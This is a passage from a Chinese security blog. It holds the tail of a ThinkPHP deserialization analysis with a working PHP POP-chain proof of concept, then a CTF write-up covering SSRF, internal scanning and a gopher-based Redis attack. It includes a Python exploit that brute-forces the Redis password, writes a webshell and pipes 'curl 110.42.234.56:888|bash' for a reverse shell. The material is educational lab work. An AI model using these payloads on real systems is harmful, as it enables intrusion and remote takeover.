href="/images/62aee86b09475431296eb265.png" title="image-20220619160012428" class="gallery-item"><img src="/images/62aee86b09475431296eb265.png" alt="image-20220619160012428"></a></p><p>这里的$data的值就是<code>$this-&gt;data</code>的值，调用了<code>$this-&gt;getAttr($key)</code>，其中的$key就是<code>$this-&gt;data</code>中的’rainb0w’。跟进<code>$this-&gt;getAttr()</code>：</p><p><a href="/images/62aee88609475431296ed28b.png" title="image-20220619160345824" class="gallery-item"><img src="/images/62aee88609475431296ed28b.png" alt="image-20220619160345824"></a></p><p>根据上面的分析，这个$value就是<code>$this-&gt;data[&#39;rainb0w&#39;]</code>。接着从跟进<code>$this-&gt;getValue()</code>的分析那里继续走：</p><p><a href="/images/62aee8dd09475431296f42c0.png" class="gallery-item"><img src="/images/62aee8dd09475431296f42c0.png"></a></p><p>如果想调用<code>$this-&gt;getJsonValue()</code>，我们就要进入if语句。因此<code>$this-&gt;json</code>应该被设为<code>array(&#39;rainb0w&#39;)</code>，<code>$this-&gt;withAttr[&#39;rainb0w&#39;]</code>应该是一个数组。</p><p>到<code>getJsonValue()</code>：</p><p><a href="/images/62aee89909475431296ee9b4.png" title="image-20220619160541293" class="gallery-item"><img src="/images/62aee89909475431296ee9b4.png" alt="image-20220619160541293"></a></p><p>这里的<code>$this-&gt;withAttr</code>需要的值也在上面的分析中给出，同时也要让<code>$this-&gt;jsonAssoc</code>的值应该是true，这样才能进入if中。因此可以编写出全部的POC了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = <span class="keyword">array</span>(<span class="string">&#x27;rainb0w&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="测试利用"><a href="#测试利用" class="headerlink" title="测试利用"></a>测试利用</h2><p>首先确保index.php中已经写了反序列化点，比如：</p><p><a href="/images/62aee91609475431296f81b0.png" title="image-20220619164738089" class="gallery-item"><img src="/images/62aee91609475431296f81b0.png" alt="image-20220619164738089"></a></p><p>接着去浏览器传一下payload，弹个计算器玩玩:</p><p><a href="/images/62aee91f09475431296f8cf0.png" title="image-20220619164901055" class="gallery-item"><img src="/images/62aee91f09475431296f8cf0.png" alt="image-20220619164901055"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 SWCTF WriteUp</title>
      <link href="/2022/05/07/swctf/"/>
      <url>/2022/05/07/swctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>写一下2022年实验室招新赛题目的wp吧，这次招新赛我出了5道Web题目，并且搭建了整个靶场，收获很多。在出题的过程中，我对一些题目也有了更深的理解，这里记录一下这五道题目的题解吧。</p><h2 id="snert翻译"><a href="#snert翻译" class="headerlink" title="snert翻译"></a>snert翻译</h2><h3 id="获取线索"><a href="#获取线索" class="headerlink" title="获取线索"></a>获取线索</h3><p>打开环境，查看网站源码，发现一个hint：</p><p><a href="/images/4dd4c7e8bf650027.png" class="gallery-item"><img src="/images/4dd4c7e8bf650027.png"></a></p><p>传递<code>source</code>参数，得到：</p><p><a href="/images/81be3812550efcdc.png" class="gallery-item"><img src="/images/81be3812550efcdc.png"></a></p><p>很明显就可以看出，这里输出了<code>ifconfig</code>，我们可以通过这些获得一些内网信息。</p><p>输入框中随意输入字符，页面响应时间很长，再加上刚刚得到的一些信息，猜测这里存在ssrf漏洞，输入百度域名进行尝试：</p><p><a href="/images/ed713dd72868ff05.png" class="gallery-item"><img src="/images/ed713dd72868ff05.png"></a></p><p>确认是ssrf漏洞。对word参数进行fuzz，发现<code>file</code>协议和<code>dict</code>协议这两个常⽤的读取⽂件的协议被过滤。但是我们可以通过如下方式来进行绕过：</p><p><code>file&lt;空格&gt;///xxxxx</code>。怎样得知我们需要读取的文件目录呢？这里有两个线索，首先我们利用wappalyzer</p><p><a href="/images/26e0bd7642a2c404.png" class="gallery-item"><img src="/images/26e0bd7642a2c404.png"></a></p><p>得知网站的编程语言使用的是PHP，然后我们随意进入一个目录，根据网站弹出报错信息：</p><p><a href="/images/e4f11a8fd9e8a419.png" class="gallery-item"><img src="/images/e4f11a8fd9e8a419.png"></a></p><p>得知网站使用的是apache这个web服务器，而apache的默认网站根目录为&#x2F;var&#x2F;www&#x2F;html，因此我们要读取的源码文件就是<code>/var/www/html/index.php</code>。</p><p>利用该方式读取源码（<code>?word=file: ///var/www/html/index.php&amp;submit=%E6%8F%90%E4%BA%A4</code>）：</p><p><a href="/images/8b1c5c204800d886.png" class="gallery-item"><img src="/images/8b1c5c204800d886.png"></a></p><p>弹出两个index.php页面，查看网页源码即可得到php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$word</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$curl_cmd</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="comment">//危险！危险！危险！</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl_cmd</span>, CURLOPT_URL, <span class="variable">$word</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl_cmd</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%3fphp|\?php|%26|&amp;|%3f%70%68%70|?%70%68%70|ls/i&#x27;</span>,<span class="variable">$word</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;输入这些是想干啥捏？-。-&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl_cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl_cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/dict|\.\.\/|https\:\/\/|_|127.0.0.1|0.0.0.0|localhost|file\:\//is&#x27;</span>, <span class="variable">$word</span>,<span class="variable">$match</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Brody和Chad这周末会举办一个超棒的派对，所有的大黑客都会出席，但你猜谁收不到邀请？你！↖（^ω^）↗&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl</span>(<span class="variable">$word</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码，发现源码中使用了<code>curl_exec</code>函数，并且函数中的参数可控，因此导致了ssrf。我们可以发现这里过滤了dict、file和https协议，但是http协议还可以使用，可以利用http协议来探测内网其他网段的信息。接下来我们传入参数<code>?word=http%3A%2F%2F172.26.0.3&amp;submit=%E6%8F%90%E4%BA%A4</code> 并抓包，探测内网存活主机：</p><p><a href="/images/72614e159ef2c3bc.png" class="gallery-item"><img src="/images/72614e159ef2c3bc.png"></a></p><p>观察结果，我们发现172.26.0.2的主机给出我们提示：</p><p><a href="/images/e5fbfa03ae923fdd.png" class="gallery-item"><img src="/images/e5fbfa03ae923fdd.png"></a></p><p>接着我们对172.26.0.2的主机进行端口扫描。为了节约时间，通常我们只需要对常用端口进行扫描即可，因此利用常用端口字典进行爆破是一种好办法。但是直接进行从0-65535爆破也是可以的(没有什么不可以的，只是需要时间很长罢了)，方法与上面类似：</p><p><a href="https://pic.imgdb.cn/item/626687a7b10bd.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687a7b10bd.png"></a></p><p>通过扫描结果，我们发现6379端口处于开放状态，而6379属于<code>redis</code> 数据库的端口，并且根据回显的 报错信息也能确认⽬标服务器使⽤了redis数据库：</p><p><a href="https://pic.imgdb.cn/item/626687bf82c09.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687bf82c09.png"></a></p><p>这⾥我们可以使⽤ssrf通过redis认证攻击来对服务器进行攻击（<a href="https://zhuanlan.zhihu.com/p/113396148">SSRF漏洞攻击Redis介绍</a>）。</p><h3 id="利用gopher协议攻击redis数据库"><a href="#利用gopher协议攻击redis数据库" class="headerlink" title="利用gopher协议攻击redis数据库"></a>利用gopher协议攻击redis数据库</h3><p>由于dict协议被过滤，所以这⾥我们使⽤ <code>gopher</code>协议。</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code> （’_‘字符可以更换为任意字符，但不可省略。）​</p><ul><li><p>gopher的默认端口是70，如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p></li><li><p>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p></li></ul><p>在gopher协议中发送HTTP的数据，需要以下三步：​</p><ol><li><p>构造HTTP数据包</p></li><li><p>URL编码、替换回车换行为%0d%0a</p></li><li><p>发送gopher协议</p></li></ol><h3 id="写脚本将webshell写入主机中"><a href="#写脚本将webshell写入主机中" class="headerlink" title="写脚本将webshell写入主机中"></a>写脚本将webshell写入主机中</h3><p>我们可以利用一些简单的命令测试一下redis是否已经认证过了，比如这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set snert <span class="number">1</span></span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>通过gopher协议和redis数据包格式构造数据流后，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.26.0.2:6379/a%2A3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Asnert%0D%0A%241%0D%0A1%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A</span><br></pre></td></tr></table></figure><p>传入后，回显如下：</p><p><a href="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6266a41d239250f7c5e52df2.png"></a></p><p>提示存在密码。</p><p>这里直接贴上我写的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://web.snert.cn:5000/index.php&#x27;</span></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;172.26.0.2&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/a&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell = <span class="string">&quot;\n\n\n\n&lt;?=system(\&quot;curl 110.42.234.56:888|bash\&quot;);?&gt;\n\n\n\n&quot;</span><span class="comment">#开始和结束的\n必须要有一个，也就是前后各有一个，当然，多个也可以，如果是写在crontab中可以避免crontab的语法错误。</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cmd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        cmd = [<span class="string">&quot;auth &quot;</span>,</span><br><span class="line">               <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">               <span class="string">&#x27;save&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;quit&#x27;</span></span><br><span class="line">               ]</span><br><span class="line">        cmd[<span class="number">0</span>] += <span class="built_in">str</span>(i)</span><br><span class="line">        payload = main(cmd)</span><br><span class="line">        params = &#123;<span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload),<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(url,params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERR invalid password&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;找到密码，密码为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    cmd.insert(<span class="number">2</span>,<span class="string">&quot;set snert &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)))</span><br><span class="line">    cmd.insert(<span class="number">3</span>,<span class="string">&quot;config set dir /var/www/html&quot;</span>)</span><br><span class="line">    cmd.insert(<span class="number">4</span>,<span class="string">&quot;config set dbfilename shell.php&quot;</span>)</span><br><span class="line">    payload = main(cmd)</span><br><span class="line">    params = &#123;<span class="string">&#x27;word&#x27;</span>: <span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload), <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">    req = requests.get(url, params)</span><br><span class="line"></span><br><span class="line">    fantan = <span class="built_in">input</span>(<span class="string">&#x27;已经写入webshell,是否准备反弹shell?输入yes或no：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> fantan == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">        params = &#123;<span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;http://172.26.0.2/shell.php&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">        req1 = requests.get(url,params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本写的有点乱，所以我解释一下。这个脚本大概分为了三部分，一部分是找到redis的密码，一部分是结合密码利用redis存入我们构造好的webshell至主机中，还有一部分是执行构造好的webshell，反弹shell到我们的服务器上。</p><p>要理解这个脚本，首先我们要先知道我们需要redis执行哪些命令。直接看脚本是怎么写的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth xxxx</span><br><span class="line">flushall</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>首先通过这些命令然后将i从0至9999遍历一遍，爆破出redis的认证密码，可以得到密码为9547。（题目也在靶场给出hint，密码长度&lt;5且均由数字构成。）</p><p>当我们得到密码后就可以让redis执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth 9547</span><br><span class="line">flushall</span><br><span class="line">set snert webshell</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>这里解释一下这些命令。首先是auth命令，命令用于检测给定的密码和配置文件中的密码是否相符，也就是验证我们的密码是否正确。然后是flushall：清空整个 Redis 服务器的数据(删除所有数据库的所有 key )。接着添加名为snert的key，值为我们所定义的webshell，也就是<code>\n\n\n\n&lt;?=system(\&quot;curl 110.42.234.56:888|bash\&quot;);?&gt;\n\n\n\n</code>（这里需要注意一下，因为在我们拿到的源码中我们可以得知，系统是ban掉了<code>?php</code>字符串的，所以使用短标签绕过。并且我们无法通过常规查看flag的手段来getflag，因为当你<code>cat /flag</code>之后你就会发现，这该死的出题人也就是我，把真正的flag写在了一个隐藏文件中。因此我们需要拿到服务器的shell）。接着设置备份路径为&#x2F;var&#x2F;www&#x2F;html，然后设置备份文件名为shell.php，开始备份，最后退出。</p><p>其中redis_format函数将上面这些命令更改为Redis的数据发送的数据包格式（具体实现可以看代码），也就是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://172.26.0.2:6379/a*2</span><br><span class="line">$4</span><br><span class="line">auth</span><br><span class="line">$4</span><br><span class="line">9547</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$8</span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">snert</span><br><span class="line">$51</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?=system(&quot;curl 110.42.234.56:888|bash&quot;);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line">$6</span><br><span class="line">config</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$10</span><br><span class="line">dbfilename</span><br><span class="line">$9</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">//注意quit后面还有一个换行哦</span><br></pre></td></tr></table></figure><p>这里的curl只是对应index.php中的<code>curl_exec</code> 函数，为了理解得更直观才这样写的。gopher及后面的数据才是我们需要传入的。（这点应该是不需要说的，自己看源码就可以知道。）接着将使用main函数其转化为url编码，在构造payload的时候应该注意，TCP数据流前不能再用<code>_</code>这个字符了，因为被代码过滤了，但是这个字符并不是必须，我们可以利用任何一个字符代替它（详情请看这篇文章：<a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a>）。接着利用requests模块传入数据：</p><p><a href="https://pic.imgdb.cn/item/626687db50948.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687db50948.png"></a></p><p>接着是第三部分，在执行之前脚本会询问你是否需要反弹shell，你在输入yes之前，应该确保自己已经监听起了相应服务器的相应端口。接着脚本会继续传参，其中word参数的值为<code>http://172.26.0.2/shell.php</code>，这样的话我们就成功在<code>172.26.0.3</code> 也就是我们的靶机 上的index.php包含进来了一个<code>172.26.0.2</code>机器上的shell.php文件，接着shell.php就会被执行。</p><p><a href="https://pic.imgdb.cn/item/626687ed9706b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626687ed9706b.png"></a></p><p>这里再次提醒一下，如果你不拿到shell直接利用cat &#x2F;flag的话是看不到真正的flag的，你需要找到那个隐藏的文件&#x2F;.true_flag才可以拿到flag。另外，要注意的是，我们反弹的shell拿到的是root权限，具体原因比较复杂，在这里不作解释。你可以利用这个权限来完成破坏靶机等操作。（比赛未允许的情况的下还是不要做）</p><h3 id="利用工具Gopherus得到payload"><a href="#利用工具Gopherus得到payload" class="headerlink" title="利用工具Gopherus得到payload"></a>利用工具Gopherus得到payload</h3><p><strong>注意</strong>，在使用一些工具的同时，我们也应当了解解决问题的原理。不要无脑使用网上已经写好的工具，避免成为<strong>“Script Kid”</strong>。</p><p><a href="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6266882b239250f7c593652b.png"></a></p><p>Gopherus项目地址:<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>这个工具无法添加redis的auth命令，因此通过该工具得到的payload在本题中无法直接使用。但是我们可以按照redis数据包的格式和gopher协议的格式自行添加auth命令，同时不要忘记更改<code>_</code>为其他任何字符。</p><h2 id="主人的命令"><a href="#主人的命令" class="headerlink" title="主人的命令"></a>主人的命令</h2><h3 id="获取线索-1"><a href="#获取线索-1" class="headerlink" title="获取线索"></a>获取线索</h3><p>打开环境，可以看到一个和蔼的头像，但是这不重要。查看网页源码，发现一个hint：</p><p><a href="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png" class="gallery-item"><img 